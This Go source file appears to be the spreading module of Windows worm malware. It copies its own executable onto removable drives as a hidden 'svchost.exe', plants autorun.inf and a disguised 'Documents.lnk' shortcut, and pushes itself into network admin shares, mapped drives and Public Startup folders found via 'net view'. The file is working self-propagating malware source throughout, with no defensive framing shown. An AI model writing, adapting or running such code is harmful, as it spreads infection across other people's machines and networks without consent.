//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// removableDrives lists writable removable drives (D: and above).
func removableDrives() []string {
	var drives []string
	for _, letter := range "DEFGHIJKLMNOPQRSTUVWXYZ" {
		root := string(letter) + ":\\"
		if _, err := os.Stat(root); err != nil {
			continue
		}
		out, err := exec.Command("powershell", "-NoProfile", "-Command",
			fmt.Sprintf("(Get-CimInstance Win32_LogicalDisk -Filter \"DeviceID='%s:'\").DriveType", string(letter))).Output()
		if err != nil {
			continue
		}
		if strings.Contains(string(out), "2") { // DriveType 2 = Removable
			drives = append(drives, root)
		}
	}
	return drives
}

// infectRemovableDrives copies the implant to every removable drive and
// plants an autorun.inf plus a disguised .lnk.
func (w *Worm) infectRemovableDrives() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	for _, root := range removableDrives() {
		dest := root + "svchost.exe"
		if err := copyFile(exe, dest); err != nil {
			continue
		}
		exec.Command("attrib", "+h", "+s", dest).Run()

		autorun := root + "autorun.inf"
		content := "[AutoRun]\r\naction=Open folder to view files\r\nshellexecute=svchost.exe\r\nUseAutoPlay=1\r\n"
		os.WriteFile(autorun, []byte(content), 0o644)
		exec.Command("attrib", "+h", "+s", autorun).Run()

		link := root + "Documents.lnk"
		ps := fmt.Sprintf("$s=(New-Object -ComObject WScript.Shell).CreateShortcut('%s');$s.TargetPath='%s';$s.IconLocation='shell32.dll,3';$s.Save()", link, dest)
		exec.Command("powershell", "-NoProfile", "-Command", ps).Run()

		w.mu.Lock()
		if len(w.findings) < 64 {
			w.findings = append(w.findings, "usb drive infected: "+root)
		}
		w.mu.Unlock()
		w.exploited.Add(1)
		logf("worm: usb drive infected: %s", root)
	}
}

// sharesOnce copies the implant into visible writable shares and their
// public Startup folders.
func (w *Worm) sharesOnce() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	seen := map[string]bool{}
	add := func(share string) {
		if share == "" || seen[share] {
			return
		}
		seen[share] = true
		w.infectShare(share, exe)
	}

	if out, err := exec.Command("net", "view").Output(); err == nil {
		for _, line := range strings.Split(string(out), "\n") {
			fields := strings.Fields(line)
			for _, f := range fields {
				if strings.HasPrefix(f, `\\`) && !seen[f] {
					add(f + `\C$`)
					break
				}
			}
		}
	}
	for _, letter := range "DEFGHIJKLMNOPQRSTUVWXYZ" {
		root := string(letter) + ":\\"
		if _, err := os.Stat(root); err == nil {
			add(root) // mapped drive root share
		}
	}
}

func (w *Worm) infectShare(share, exe string) {
	dests := []string{
		filepath.Join(share, "svchost.exe"),
		filepath.Join(share, "Users", "Public", "Startup", "svchost.exe"),
	}
	for _, dest := range dests {
		if err := copyFile(exe, dest); err == nil {
			exec.Command("attrib", "+h", dest).Run()
			w.exploited.Add(1)
			logf("worm: share infected: %s", dest)
			return
		}
	}
}

func copyFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	os.MkdirAll(filepath.Dir(dst), 0o755)
	return os.WriteFile(dst, data, 0o755)
}
